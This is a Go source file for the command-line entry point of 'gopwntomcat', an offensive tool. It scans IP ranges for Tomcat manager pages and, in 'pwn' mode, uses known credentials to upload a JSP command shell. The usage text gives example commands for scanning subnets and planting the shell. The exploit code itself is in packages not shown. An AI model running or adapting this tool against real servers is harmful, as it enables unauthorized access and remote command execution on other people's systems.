package main

import (
	"flag"
	"fmt"
	"os"

	"github.com/patrickhener/gopwntomcat/pwn"
	"github.com/patrickhener/gopwntomcat/scan"
	"github.com/patrickhener/gopwntomcat/utils"
)

const version = "v0.0.1"

var (
	mode      string
	targetURI string
	port      int
	ssl       bool
	threads   int
	user      string
	pass      string
	customJSP string
)

func main() {
	var rhostsFlag utils.Rhosts

	flag.StringVar(&mode, "mode", "scan", "'scan' or 'pwn' - either find vulnerable tomcat or directly pwn one")
	flag.StringVar(&targetURI, "targeturi", "/manager/html", "manager uri")
	flag.IntVar(&port, "port", 8080, "Port of target")
	flag.BoolVar(&ssl, "ssl", false, "Wether to use https or not (default false)")
	flag.IntVar(&threads, "threads", 1, "Worker threads")
	flag.Var(&rhostsFlag, "rhost", "IP or CIDR (scan: define multiple -rhost for multiple targets, pwn: define only a single one - no CIDR")
	flag.StringVar(&user, "user", "", "pwn: user to authenticate with")
	flag.StringVar(&pass, "pass", "", "pwn: password to authenticate with")
	flag.StringVar(&customJSP, "customjsp", "", "Provide a custom jsp shell to be uploaded (default 'use embedded one')")

	flag.Usage = func() {
		fmt.Printf("gopwntomcat %s\n", version)
		fmt.Printf("Usage: %s -mode [scan|pwn] [mode specific options] (default: mode scan)\n\n", os.Args[0])
		fmt.Println("Scan options:")
		fmt.Println("\t-port\t\tThe port to use while scanning\t\t(default: 8080)")
		fmt.Println("\t-ssl\t\tWhether or not to use ssl\t\t(default: false)")
		fmt.Println("\t-targeturi\tWhere the manager app is located at\t(default: /manager/html)")
		fmt.Println("\t-threads\tConcurrent threads while scanning\t(default: 1)")
		fmt.Println("\t-rhost\t\tIP or CIDR - you can define multiple")
		fmt.Println("")
		fmt.Println("Pwn options:")
		fmt.Println("\t-port\t\tThe port to use for connection\t\t(default: 8080)")
		fmt.Println("\t-ssl\t\tWhether or not to use ssl\t\t(default: false)")
		fmt.Println("\t-targeturi\tWhere the manager app is located at\t(default: /manager/html)")
		fmt.Println("\t-user\t\tValid username for logon\t\t(default: tomcat)")
		fmt.Println("\t-pass\t\tValid password for logon\t\t(default: tomcat)")
		fmt.Println("\t-customjsp\tDefine custom jsp to upload\t\t(default: embedded cmd jsp)")
		fmt.Println("\t-rhost\t\tSingle IP, no multiple -rhost flags allowed")
		fmt.Println("")
		fmt.Println("Examples:")
		fmt.Println("\tScan a /24 net with 5 threads and different manager url:")
		fmt.Println("\t\tgopwntomcat -targeturi /custom/path/to/manager/html -rhost 192.168.1.0/24")
		fmt.Println("\tScan multiple ips on different port with ssl:")
		fmt.Println("\t\tgopwntomcat -port 8443 -ssl -rhost 192.168.1.12 -rhost 10.10.10.100")
		fmt.Println("\tPwn a tomcat server you know the credentials of:")
		fmt.Println("\t\tgopwntomcat -mode pwn -rhost 192.168.1.12 -user tomcat -pass s3cret")
		fmt.Println("\tPwn a tomcat server you know the credentials of with custom jsp:")
		fmt.Println("\t\tgopwntomcat -mode pwn -rhost 192.168.1.12 -user tomcat -pass s3cret -customjsp ./custom.jsp")
	}

	flag.Parse()

	if len(rhostsFlag) == 0 {
		fmt.Println("You need to provide at least one '-rhost'")
		fmt.Println("see -h for help")
		os.Exit(1)
	}

	switch mode {
	case "scan":
		scan.Start(rhostsFlag, port, threads, ssl, targetURI)
	case "pwn":
		pwn.Start(rhostsFlag, port, ssl, targetURI, user, pass, customJSP)
	default:
		fmt.Println("You need to either choose '-mode scan' or '-mode pwn'")
	}

}
